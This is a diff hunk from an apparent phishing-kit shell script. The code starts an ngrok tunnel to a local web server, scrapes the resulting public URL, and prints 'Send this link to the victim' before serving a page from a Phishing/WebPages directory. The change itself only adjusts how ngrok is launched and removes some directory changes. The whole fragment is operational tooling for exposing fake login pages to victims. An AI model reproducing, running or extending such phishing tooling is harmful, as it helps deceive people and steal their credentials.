@@ -272,20 +272,14 @@ echo -e "\e[32m......................\e[31mStarting Server!\e[32m...............
 echo ""
 echo ""
 
-cd $HOME
-./ngrok http 5000 > /dev/null &
+
+ngrok http 5000 > /dev/null &
 sleep 15
 link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
 
 
 echo "Send this link to the victim --    $link" | lolcat
 
-
-
-
-cd $HOME
 echo -e "\e[96m"
-cd $HOME
-cd /$HOME/Phishing/WebPages/$page
 details
 cd $HOME
